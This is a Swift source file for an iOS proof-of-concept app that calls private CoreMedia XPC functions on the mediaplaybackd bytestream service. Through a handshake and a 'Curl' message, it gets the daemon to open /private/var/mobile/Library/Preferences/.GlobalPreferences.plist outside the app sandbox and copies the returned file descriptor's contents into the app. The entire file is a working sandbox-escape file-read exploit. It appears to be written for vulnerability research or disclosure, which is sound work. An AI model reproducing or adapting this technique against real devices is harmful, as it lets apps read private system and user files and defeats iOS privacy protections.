//
//  ContentView.swift
//  MConfPoC
//
//  Minimal CoreMedia bytestream PoC.
//  Runs only on explicit Run-button press and requests:
//  /private/var/mobile/Library/Preferences/.GlobalPreferences.plist
//  A successful read is saved as Documents/GlobalPreferences.plist.
//  Short execution messages are shown in the app and saved to Documents/run.log.
//

import Foundation
import SwiftUI
import UIKit
import Darwin

// MARK: - Logging

private let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!
private var logFd: Int32 = -1

private func openLog() {
    if logFd >= 0 { close(logFd); logFd = -1 }
    let path = docs.appendingPathComponent("run.log").path
    logFd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0o644)
}

private final class EHBox {
    var desc = ""
    var seen = false
}

// MARK: - ContentView

struct ContentView: View {
    @State private var status = "Ready"
    @State private var isRunning = false
    @State private var logs: [String] = ["Press Run to start the test."]

    var body: some View {
        VStack(alignment: .leading, spacing: 12) {
            Text("CoreMedia PoC").font(.headline)
            Text(status)
                .font(.system(.footnote, design: .monospaced))
                .foregroundStyle(.secondary)

            Button {
                guard !isRunning else { return }
                isRunning = true
                status = "Running…"
                logs = []
                DispatchQueue.global(qos: .userInitiated).async {
                    runChain { line in
                        DispatchQueue.main.async { logs.append(line) }
                    }
                    DispatchQueue.main.async {
                        isRunning = false
                        status = "Finished — see Documents/run.log"
                    }
                }
            } label: {
                Text(isRunning ? "Running…" : "Run")
                    .frame(maxWidth: .infinity)
            }
            .buttonStyle(.borderedProminent)
            .disabled(isRunning)

            ScrollView {
                VStack(alignment: .leading, spacing: 5) {
                    ForEach(Array(logs.enumerated()), id: \.offset) { _, line in
                        Text(line)
                            .font(.system(.caption, design: .monospaced))
                            .frame(maxWidth: .infinity, alignment: .leading)
                    }
                }
            }
            .frame(maxHeight: 220)
        }
        .padding()
    }
}

// MARK: - The chain

private func runChain(onLog: @escaping (String) -> Void) {
    openLog()
    defer { if logFd >= 0 { close(logFd); logFd = -1 } }
    func logLine(_ message: String) {
        let line = message + "\n"
        if logFd >= 0 { _ = line.withCString { write(logFd, $0, strlen($0)) } }
        onLog(message)
    }
    logLine("Run started")
    let dev = UIDevice.current
    logLine("Device: \(dev.model), iOS \(dev.systemVersion)")

    // Step 1 — resolve symbols.
    guard let cm = dlopen("/System/Library/Frameworks/CoreMedia.framework/CoreMedia", RTLD_NOW | RTLD_LOCAL) else {
        logLine("CoreMedia load failed"); return
    }
    let rtld = UnsafeMutableRawPointer(bitPattern: -2)
    guard let pBasic = dlsym(cm, "FigXPCCreateBasicMessage"),
          let pBegin = dlsym(cm, "FigMemoryOriginBeginEstablishingMemoryRecipientByFillingInXPCMessage1"),
          let pComp  = dlsym(cm, "FigMemoryOriginCompleteEstablishingMemoryRecipientUsingXPCMessage2"),
          let pRecip = dlsym(cm, "FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2"),
          let pSetURL = dlsym(cm, "FigXPCMessageSetCFURL"),
          let pConnCreate = dlsym(rtld, "xpc_connection_create_mach_service"),
          let pSetEH = dlsym(rtld, "xpc_connection_set_event_handler"),
          let pResume = dlsym(rtld, "xpc_connection_resume"),
          let pSendReply = dlsym(rtld, "xpc_connection_send_message_with_reply"),
          let pVal = dlsym(rtld, "xpc_dictionary_get_value"),
          let pU64 = dlsym(rtld, "xpc_dictionary_get_uint64"),
          let pSetU64 = dlsym(rtld, "xpc_dictionary_set_uint64"),
          let pDupFd = dlsym(rtld, "xpc_dictionary_dup_fd"),
          let pGetData = dlsym(rtld, "xpc_dictionary_get_data"),
          let pI64 = dlsym(rtld, "xpc_dictionary_get_int64"),
          let pSetI64 = dlsym(rtld, "xpc_dictionary_set_int64"),
          let pDesc = dlsym(rtld, "xpc_copy_description"),
          let pType = dlsym(rtld, "xpc_get_type"),
          let pTypeName = dlsym(rtld, "xpc_type_get_name"),
          let pRetain = dlsym(rtld, "xpc_retain"),
          let pRel = dlsym(rtld, "xpc_release") else {
        logLine("Required symbol missing"); return
    }

    typealias FBasic = @convention(c) (UInt32, UInt64, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FBegin = @convention(c) (UnsafeMutableRawPointer?) -> Int32
    typealias FComp = @convention(c) (OpaquePointer?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FRecip = @convention(c) (OpaquePointer?, UnsafeMutableRawPointer?, UnsafePointer<CChar>?, UnsafeMutablePointer<UnsafeMutableRawPointer?>?) -> Int32
    typealias FSetURL = @convention(c) (UnsafeMutableRawPointer?, UnsafePointer<CChar>, UnsafeRawPointer?) -> Int32
    typealias FConnCreate = @convention(c) (UnsafePointer<CChar>, UnsafeMutableRawPointer?, UInt64) -> UnsafeMutableRawPointer?
    typealias FSetEH = @convention(c) (UnsafeMutableRawPointer?, AnyObject) -> Void
    typealias FResume = @convention(c) (UnsafeMutableRawPointer?) -> Void
    typealias FSendReply = @convention(c) (UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, UnsafeMutableRawPointer?, AnyObject) -> Void
    typealias FVal = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> OpaquePointer?
    typealias FU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> UInt64
    typealias FSetU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UInt64) -> Void
    typealias FDupFd = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int32
    typealias FGetData = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UnsafeMutablePointer<Int>?) -> UnsafeRawPointer?
    typealias FI64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int64
    typealias FSetI64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, Int64) -> Void
    typealias FDesc = @convention(c) (OpaquePointer?) -> UnsafeMutablePointer<CChar>?
    typealias FType = @convention(c) (OpaquePointer?) -> OpaquePointer?
    typealias FTypeName = @convention(c) (OpaquePointer?) -> UnsafePointer<CChar>?
    typealias FRetain = @convention(c) (OpaquePointer?) -> Void
    typealias FRel = @convention(c) (OpaquePointer?) -> Void

    let fBasic = unsafeBitCast(pBasic, to: FBasic.self)
    let fBegin = unsafeBitCast(pBegin, to: FBegin.self)
    let fComp = unsafeBitCast(pComp, to: FComp.self)
    let fRecip = unsafeBitCast(pRecip, to: FRecip.self)
    let fSetURL = unsafeBitCast(pSetURL, to: FSetURL.self)
    let fConnCreate = unsafeBitCast(pConnCreate, to: FConnCreate.self)
    let fSetEH = unsafeBitCast(pSetEH, to: FSetEH.self)
    let fResume = unsafeBitCast(pResume, to: FResume.self)
    let fSendReply = unsafeBitCast(pSendReply, to: FSendReply.self)
    let fVal = unsafeBitCast(pVal, to: FVal.self)
    let fU64 = unsafeBitCast(pU64, to: FU64.self)
    let fSetU64 = unsafeBitCast(pSetU64, to: FSetU64.self)
    let fDupFd = unsafeBitCast(pDupFd, to: FDupFd.self)
    let fGetData = unsafeBitCast(pGetData, to: FGetData.self)
    let fI64 = unsafeBitCast(pI64, to: FI64.self)
    let fSetI64 = unsafeBitCast(pSetI64, to: FSetI64.self)
    let fDesc = unsafeBitCast(pDesc, to: FDesc.self)
    let fType = unsafeBitCast(pType, to: FType.self)
    let fTypeName = unsafeBitCast(pTypeName, to: FTypeName.self)
    let fRetain = unsafeBitCast(pRetain, to: FRetain.self)
    let fRel = unsafeBitCast(pRel, to: FRel.self)

    func desc(_ o: OpaquePointer?) -> String {
        guard let o = o, let c = fDesc(o) else { return "nil" }
        defer { free(c) }
        return String(cString: c).replacingOccurrences(of: "\n", with: " ")
    }
    func typeName(_ o: OpaquePointer?) -> String {
        guard let o = o, let t = fType(o), let n = fTypeName(t) else { return "?" }
        return String(cString: n)
    }

    // Step 2 — connect (no entitlement required).
    guard let conn = "com.apple.coremedia.mediaplaybackd.bytestream.xpc".withCString({ fConnCreate($0, nil, 0) }) else {
        logLine("XPC connection failed"); return
    }
    let ehBox = EHBox()
    let eh: @convention(block) (UnsafeMutableRawPointer?) -> Void = { obj in
        guard let obj = obj else { return }
        ehBox.desc = "\(typeName(OpaquePointer(obj))): \(String(desc(OpaquePointer(obj)).prefix(200)))"
        ehBox.seen = true
    }
    fSetEH(conn, eh as AnyObject)
    fResume(conn)
    logLine("XPC connected")

    func send(_ m: UnsafeMutableRawPointer?) -> (OpaquePointer?, String) {
        guard let m = m else { return (nil, "nil") }
        let sem = DispatchSemaphore(value: 0)
        var out: OpaquePointer? = nil
        var tn = "?"
        let hb: @convention(block) (UnsafeMutableRawPointer?) -> Void = { obj in
            guard let obj = obj else { sem.signal(); return }
            tn = typeName(OpaquePointer(obj))
            if tn == "dictionary" || tn == "error" {
                fRetain(OpaquePointer(obj))
                out = OpaquePointer(obj)
            }
            sem.signal()
        }
        fSendReply(conn, m, nil, hb as AnyObject)
        if sem.wait(timeout: .now() + 8) != .success { return (nil, "timeout-8s") }
        return (out, tn)
    }

    // Step 3 — memory-origin handshake.
    var rp1Msg: UnsafeMutableRawPointer? = nil
    if fBasic(0x2e727031, 0, &rp1Msg) == 0, let m1 = rp1Msg {           // '.rp1'
        let (r1, t1) = send(m1)
        logLine("Handshake 1: \(t1)")
        fRel(OpaquePointer(m1))
        if let r1 = r1, t1 == "dictionary" {
            var rp2Msg: UnsafeMutableRawPointer? = nil
            if fBasic(0x2e727032, 0, &rp2Msg) == 0, let m2 = rp2Msg {   // '.rp2'
                var recip: UnsafeMutableRawPointer? = nil
                let cr = "mconf".withCString { fRecip(r1, m2, $0, &recip) }
                let (r2, t2) = send(m2)
                logLine("Handshake 2: \(t2)")
                if let r2 = r2 { fRel(r2) }
                fRel(OpaquePointer(m2))
            }
            fRel(r1)
        }
    }
    var orgMsg: UnsafeMutableRawPointer? = nil
    if fBasic(0x2e6f7267, 0, &orgMsg) == 0, let om = orgMsg {           // '.org'
        let bg = fBegin(om)
        let (or, ot) = send(om)
        logLine("Origin: \(ot)")
        if let or = or {
            if ot == "dictionary" {
                var origin: UnsafeMutableRawPointer? = nil
                let cp = fComp(or, &origin)
                logLine("Origin established: \(cp == 0 ? "yes" : "no")")
            } else {
                logLine("Origin response was not a dictionary")
            }
            fRel(or)
        }
        fRel(OpaquePointer(om))
    }

    // Read the one requested regular file and save it inside the app Documents folder.
    func takeFd(_ tag: String, fd: Int32) {
        defer { close(fd) }
        var st = stat()
        guard fstat(fd, &st) == 0 else {
            logLine("File descriptor check failed")
            return
        }
        guard (st.st_mode & 0o170000) == 0o100000 else {
            logLine("Target is not a regular file")
            return
        }
        let size = Int64(st.st_size)
        guard size > 0 && size <= 8_000_000 else {
            logLine("Unexpected file size: \(size)")
            return
        }
        var buffer = [UInt8](repeating: 0, count: Int(size))
        let count = pread(fd, &buffer, buffer.count, 0)
        guard count > 0 else {
            logLine("File read failed")
            return
        }
        let output = docs.appendingPathComponent("GlobalPreferences.plist")
        do {
            try Data(buffer.prefix(count)).write(to: output, options: .atomic)
            logLine("Saved \(count) bytes: GlobalPreferences.plist")
        } catch {
            logLine("Save failed: \(error.localizedDescription)")
        }
    }

    // 'Curl' probe: let the daemon open `path` and hand back the fd.
    func probe(_ tag: String, _ path: String) {
        let cfURL = URL(fileURLWithPath: path) as CFURL
        var msg: UnsafeMutableRawPointer? = nil
        guard fBasic(0x4375726c, 0, &msg) == 0, let m = msg else {       // 'Curl'
            logLine("Request message failed"); return
        }
        _ = fSetURL(m, "CreationURL", Unmanaged.passUnretained(cfURL).toOpaque())
        fSetU64(OpaquePointer(m), "FileOpenOptions", 0)
        let (rp, rt) = send(m)
        fRel(OpaquePointer(m))
        guard rt == "dictionary", let rp = rp else {
            logLine("Request failed: \(rt)"); if let rp = rp { fRel(rp) }; return
        }
        guard let details = fVal(rp, "ByteStreamDetails") else {
            let err = fI64(rp, ".ErrorReturn")
            logLine("Access denied (\(err))")
            fRel(rp); return
        }
        let oid = fU64(details, "ObjectID")
        logLine("Stream opened")
        let fd = fDupFd(details, "FileDescriptor")
        if fd >= 0 { logLine("File descriptor received"); takeFd(tag, fd: fd) } else { logLine("No file descriptor returned") }


        // close the stream server-side
        var mD: UnsafeMutableRawPointer? = nil
        if fBasic(0x646f6f6d, oid, &mD) == 0, let mD = mD {
            let (rd, _) = send(mD)
            if let rd = rd { fRel(rd) }
            fRel(OpaquePointer(mD))
        }
        fRel(rp)
    }

    let target = "/private/var/mobile/Library/Preferences/.GlobalPreferences.plist"
    logLine("Target: .GlobalPreferences.plist")
    probe("GlobalPreferences", target)
    logLine("Run finished")
}
